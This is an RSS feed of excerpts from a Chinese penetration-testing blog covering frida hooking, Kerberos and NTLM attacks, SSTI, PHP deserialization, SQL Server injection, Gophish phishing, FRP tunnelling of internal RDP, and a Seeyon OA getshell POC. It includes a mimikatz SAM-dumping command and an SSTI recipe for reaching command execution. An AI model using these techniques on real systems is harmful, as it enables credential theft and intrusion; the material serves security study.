<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Pentest on Reber's Blog</title><link>https://wyb0.com/categories/Pentest/</link><description>Recent content in Pentest on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Thu, 23 May 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://wyb0.com/categories/Pentest/index.xml" rel="self" type="application/rss+xml"/><item><title>使用 Hook 框架 frida 进行调试</title><link>https://wyb0.com/posts/2024/frida-hook-app/</link><pubDate>Wed, 15 May 2024 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2024/frida-hook-app/</guid><description>&lt;h3 id="0x00-frida">0x00 frida&lt;/h3>
&lt;p>1、手机端安装一个 server 程序&lt;br>
2、然后把手机端的端口转到 PC 端&lt;br>
3、PC 端写 js 脚本进行通信&lt;/p>
&lt;p>frida -U -f com.package.name -l exploit.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">hook&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Starting script&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">perform&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span> () {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">class_reference&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">use&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;package_name&amp;gt;.&amp;lt;class&amp;gt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">class_reference&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>.&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">method&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>.&lt;span style="color:#a6e22e">implementation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">args&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hook &amp;lt;class_reference&amp;gt;.&amp;lt;method&amp;gt;()&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;args is:&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">args&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">method_to_hook&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> })
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-java-层---直接调用函数">0x01 JAVA 层 - 直接调用函数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>调用静态函数&lt;/p></description></item><item><title>固件提取</title><link>https://wyb0.com/posts/2024/extracts-firmware/</link><pubDate>Fri, 29 Mar 2024 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2024/extracts-firmware/</guid><description>&lt;h3 id="0x00-固件组成">0x00 固件组成&lt;/h3>
&lt;p>固件通常由 bootloader、内核、根文件系统及其他资源文件组成&lt;br>
固件采用的根系统文件类型有很多种，常见的有 squashfs、ubifs、ext4、jeffs2 等。&lt;br>
固件文件通常以 bin、zip、LZMA、arj 等文件压缩类型封装，最常见的为 bin 和 zip 格式&lt;br>
最常采用的文件系统是 squashfs，分析人员可以使用 unsqushfs 工具对文件系统提取数据。&lt;/p></description></item><item><title>硬件接口测试</title><link>https://wyb0.com/posts/2024/hardware-interface-test/</link><pubDate>Wed, 31 Jan 2024 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2024/hardware-interface-test/</guid><description>&lt;h3 id="0x01-jtag-接口">0x01 JTAG 接口&lt;/h3>
&lt;p>主要用来读写固件，常见 JTAG 接口引脚有 10PIN、14PIN、20PIN&lt;/p>
&lt;p>一般需要接的引脚：&lt;br>
GND：接地引脚&lt;br>
TDI：测试数据输入，用于向被测设备传输测试数据&lt;br>
TDO：测试数据输出，用于从被测设备读取测试数据&lt;br>
TCK：测试时钟，用于同步测试数据的传输&lt;br>
TMS：测试模式选择，用于控制 JTAG 状态机的状态转移&lt;br>
TRST：可选，TRST 可以用来对 TAPController 进行复位（初始化）&lt;/p></description></item><item><title>使用 MSF 进行 PtH 和 PtT</title><link>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</link><pubDate>Sat, 25 Mar 2023 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</guid><description>&lt;h3 id="0x00-概述">0x00 概述&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>环境&lt;/p>
&lt;p>攻击机 MSF：172.20.10.2&lt;br>
DC (Server2008R2X64)：10.11.11.5&lt;br>
目标机 (Win7ProX86)：10.11.11.14&lt;/p></description></item><item><title>Kerberos 与 NTLM Hash 与 Ticket</title><link>https://wyb0.com/posts/2022/kerberos-hash-ticket/</link><pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2022/kerberos-hash-ticket/</guid><description>&lt;h3 id="0x00-kerberos">0x00 Kerberos&lt;/h3>
&lt;p>Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。
常见的基于 Kerberos 协议攻击的方法如下图所示：
&lt;img src="https://wyb0.com/img/post/Xnip2022-10-13_17-09-29.png" alt="60">&lt;/p>
&lt;h3 id="0x01-kerberos-关键词">0x01 Kerberos 关键词&lt;/h3>
&lt;ul>
&lt;li>域控制器（Domain Controller，DC）：在域中至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。&lt;/li>
&lt;li>帐户数据库（Account Database，AD）：一个类似于 Windows 本机 SAM 的数据库，存储了域内所有网络对象的凭证，也存储所有 Client 的白名单，在白名单中的 Client 才可以申请到 TGT。&lt;/li>
&lt;li>密钥分发中心（Key Distribution Center，KDC）：KDC 维护着域中所有安全主体（SecurityPrincipal）账户信息数据库，负责管理票据、认证票据、分发票据，在 Windows 域环境中，KDC 的角色由 DC 承担。&lt;/li>
&lt;li>身份验证服务（Authentication Service，AS）：用于生成 TGT 的服务。&lt;/li>
&lt;li>票据发放服务（Ticket Granting Service，TGS）：用于生成某个服务的 ticket&lt;/li>
&lt;li>认证票据（Ticket Granting Ticket，TGT）：可以理解为入场券，通过入场券能够获得票据，是一种临时凭证的存在。&lt;/li>
&lt;li>票据（Ticket）：网络对象互相访问的凭证。&lt;/li>
&lt;li>Session Key：AS 生成的随机会话密钥。&lt;/li>
&lt;li>Server Session Key：TGS 生成的随机会话密钥。&lt;/li>
&lt;li>krbtgt 账户：每个域控制器都有一个 krbtgt 的用户账户，是 KDC 的服务账户，用来创建票据授予服务(TGS)加密的密钥。&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-kerberos-认证过程">0x02 Kerberos 认证过程&lt;/h3>
&lt;p>认证的大致过程：&lt;/p></description></item><item><title>JNDI 注入</title><link>https://wyb0.com/posts/2022/jndi/</link><pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2022/jndi/</guid><description>&lt;h3 id="0x00-jdni">0x00 JDNI&lt;/h3>
&lt;p>JNDI(Java Naming and Directory Interface) 是 Java 提供的 Java 命名和目录接口&lt;/p>
&lt;p>JNDI 可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA&lt;/p></description></item><item><title>Gophish 钓鱼测试</title><link>https://wyb0.com/posts/2021/gophish/</link><pubDate>Sun, 26 Sep 2021 11:45:33 +0000</pubDate><guid>https://wyb0.com/posts/2021/gophish/</guid><description>&lt;h3 id="0x00-gophish-使用">0x00 Gophish 使用&lt;/h3>
&lt;ul>
&lt;li>配置 Gophish 服务&lt;/li>
&lt;li>配置发送邮箱&lt;/li>
&lt;li>编写钓鱼邮件内容&lt;/li>
&lt;li>编写钓鱼页面&lt;/li>
&lt;li>添加目标邮箱&lt;/li>
&lt;li>开始攻击&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-配置-gophish-服务">0x01 配置 Gophish 服务&lt;/h3>
&lt;p>在 &lt;a href="https://github.com/gophish/gophish/releases?_blank">https://github.com/gophish/gophish/releases&lt;/a> 下载&lt;/p>
&lt;p>然后编辑 config.json，之后直接 ./gophish 运行即可&lt;/p></description></item><item><title>PHP 反序列化与字符串逃逸</title><link>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</link><pubDate>Sun, 18 Jul 2021 17:21:33 +0000</pubDate><guid>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</guid><description>&lt;h3 id="0x00-漏洞成因">0x00 漏洞成因&lt;/h3>
&lt;p>该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之后&lt;/p></description></item><item><title>Flask 模版注入（SSTI）</title><link>https://wyb0.com/posts/2021/flask-ssti/</link><pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2021/flask-ssti/</guid><description>&lt;h3 id="0x00-ssti-模版注入">0x00 SSTI 模版注入&lt;/h3>
&lt;p>SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap）&lt;/p>
&lt;p>一般步骤：&lt;br>
1、某种类型 (字符串:&amp;quot;&amp;quot;，list:[]，int：1) 开始引出&lt;br>
2、&lt;code>__class__&lt;/code> 找到当前类&lt;br>
3、&lt;code>__mro__&lt;/code> 或者 &lt;code>__base__&lt;/code> 或者 &lt;code>__bases__&lt;/code> 找到根类 &lt;code>__object__&lt;/code>&lt;br>
4、然后利用 &lt;code>__subclasses__&lt;/code> 拿到子类列表&lt;br>
5、然后在子类列表 &lt;code>__init__.__globals__.keys()&lt;/code> 找到类似 popen 能执行命令的函数&lt;/p></description></item><item><title>PHP 反序列化</title><link>https://wyb0.com/posts/2021/php-deserialize/</link><pubDate>Thu, 08 Jul 2021 17:08:50 +0000</pubDate><guid>https://wyb0.com/posts/2021/php-deserialize/</guid><description>&lt;h3 id="0x01-php-中的魔法函数">0x01 php 中的魔法函数&lt;/h3>
&lt;p>__construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。&lt;/p></description></item><item><title>通过 Sphinx 快速查询数据</title><link>https://wyb0.com/posts/2021/sphinx/</link><pubDate>Thu, 10 Jun 2021 16:44:23 +0000</pubDate><guid>https://wyb0.com/posts/2021/sphinx/</guid><description>&lt;h3 id="0x00-sphinx">0x00 Sphinx&lt;/h3>
&lt;p>Sphinx 是一款基于 SQL 的高性能全文检索引擎，Sphinx 的性能在众多全文检索引擎中也是数一数二的，利用 Sphinx我们可以完成比数据库本身更专业的搜索功能，而且可以有很多针对性的性能优化。&lt;/p></description></item><item><title>获取 NTLM Hash</title><link>https://wyb0.com/posts/2020/get-hash/</link><pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2020/get-hash/</guid><description>&lt;h3 id="0x01-通过-sam-文件获取">0x01 通过 sam 文件获取&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限)&lt;/p>
&lt;pre tabindex="0">&lt;code>mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd 需要管理员权限)&lt;/p></description></item><item><title>记一次 SQLServer 注入</title><link>https://wyb0.com/posts/2020/recording-sqlserver-injection/</link><pubDate>Mon, 22 Jun 2020 17:35:07 +0000</pubDate><guid>https://wyb0.com/posts/2020/recording-sqlserver-injection/</guid><description>&lt;h3 id="0x00-存在-sql-注入">0x00 存在 SQL 注入&lt;/h3>
&lt;p>总之是遇到一个站，登录的页面，数据包大致如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1
Host: 115.xxx.xxx.xxx:8042
Content-Length: 47
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://115.xxx.xxx.xxx:8042
Referer: http://115.xxx.xxx.xxx:8042/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt
Connection: close

uname=admin*&amp;amp;pwd=dskfsdkf&amp;amp;valCode=1197&amp;amp;telphone=
&lt;/code>&lt;/pre>&lt;p>其中验证码可以绕过，而登录名那里存在注入
&lt;img src="https://wyb0.com/img/post/Xnip2020-09-13_22-20-51.jpg" alt="">
&lt;img src="https://wyb0.com/img/post/Xnip2020-09-13_22-21-32.jpg" alt="">&lt;/p></description></item><item><title>目录遍历利用</title><link>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</link><pubDate>Mon, 16 Dec 2019 09:23:47 +0000</pubDate><guid>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</guid><description>&lt;h3 id="0x00-目录遍历">0x00 目录遍历&lt;/h3>
&lt;p>一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看&lt;/p>
&lt;p>一般来说存在目录遍历的话就是翻文件，看看有没有一些敏感信息、未授权接口之类的，一个个翻的话也确实比较麻烦&lt;/p></description></item><item><title>记一次网页 js 挂马</title><link>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</link><pubDate>Mon, 19 Aug 2019 10:17:46 +0000</pubDate><guid>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</guid><description>&lt;h3 id="0x00-常见网页挂马方式">0x00 常见网页挂马方式&lt;/h3>
&lt;ul>
&lt;li>iframe 框架挂马&lt;br>
简单来说就是加 iframe 标签&lt;/li>
&lt;li>script 挂马&lt;br>
通过各种办法加载 js 代码&lt;/li>
&lt;li>htm 文件挂马
上传 htm 文件，然后用 script 引入&lt;/li>
&lt;li>js 挂马
上传 js 文件，然后用 script 引入&lt;/li>
&lt;li>图片伪装挂马
比较新颖的一种挂马隐蔽方法&lt;/li>
&lt;li>等等。。。&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现被插入恶意-js">0x01 发现被插入恶意 js&lt;/h3>
&lt;p>前几天在做子域名搜集，搜集完后提取 title，结果看到了一个站点的 title 不正常&lt;/p></description></item><item><title>FRP 内网穿透</title><link>https://wyb0.com/posts/2019/frp-intranet-through/</link><pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate><guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid><description>&lt;h3 id="0x00-对外提供简单的文件访问服务">0x00 对外提供简单的文件访问服务&lt;/h3>
&lt;ul>
&lt;li>服务端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 监听端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 那些端口允许客户端用来映射&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">allow_ports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">22-80,3000,33389&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>➜ frp ./frps -c frps.ini
2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000
2019/07/31 00:22:31 [I] [root.go:204] Start frps success
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>客户端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[test_static_file]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 文件服务的端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 启用插件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">static_file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 要对外暴露的文件目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_local_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">C:\\Users\Administrator\Desktop\frp_file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_strip_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">myfile&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 301 认证&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_passwd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">123456&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
2019/07/31 00:36:05 [I] [service.go:221] login to server success, get run id [c8
aef41d5862b79f], server udp port [0]
2019/07/31 00:36:05 [I] [proxy_manager.go:137] [c8aef41d5862b79f] proxy added: [
test_static_file]
2019/07/31 00:36:05 [I] [control.go:144] [test_static_file] start proxy success
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>访问&lt;br>
浏览器直接访问 &lt;code>http://66.123.35.123:3000/myfile/&lt;/code> 即可访问到 frp_file 中的文件&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-使用-frp-进行内网-3389-端口转发并加密压缩">0x01 使用 frp 进行内网 3389 端口转发并加密压缩&lt;/h3>
&lt;ul>
&lt;li>服务端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp ./frps -c frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [root.go:204] Start frps success&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>客户端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[rdp]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3389&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">33389&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 加密压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_encryption&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_compression&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
2019/07/30 23:32:38 [I] [service.go:221] login to server success, get run id [ce
144f7511f63353], server udp port [0]
2019/07/30 23:32:38 [I] [proxy_manager.go:137] [ce144f7511f63353] proxy added: [
rdp]
2019/07/30 23:32:38 [I] [control.go:144] [rdp] start proxy success
&lt;/code>&lt;/pre>&lt;p>这里其实可以把 frp 做成服务，开机自启动的那种&lt;/p></description></item><item><title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title><link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link><pubDate>Sat, 27 Jul 2019 18:15:25 +0000</pubDate><guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid><description>&lt;h3 id="0x00-先说前提">0x00 先说前提&lt;/h3>
&lt;p>昨天某个小伙伴说有个注入没法搞
&lt;img src="https://wyb0.com/img/post/Xnip2019-07-27_19-20-07.png" alt="60">&lt;/p>
&lt;p>前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了
&lt;img src="https://wyb0.com/img/post/Xnip2019-07-27_18-40-20.png" alt="">
&lt;img src="https://wyb0.com/img/post/Xnip2019-07-27_18-41-18.png" alt="">&lt;/p></description></item><item><title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</title><link>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</link><pubDate>Sat, 29 Jun 2019 17:57:32 +0000</pubDate><guid>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</guid><description>&lt;h3 id="0x00-影响版本">0x00 影响版本&lt;/h3>
&lt;ul>
&lt;li>致远A8-V5协同管理软件 V6.1sp1&lt;/li>
&lt;li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3&lt;/li>
&lt;li>致远A8+协同管理软件 V7.1&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-查看接口看是否存在漏洞">0x01 查看接口看是否存在漏洞&lt;/h3>
&lt;p>如果查看 &lt;code>&amp;quot;seeyon/htmlofficeservlet&amp;quot;&lt;/code> 接口，出现如下内容则表示存在漏洞
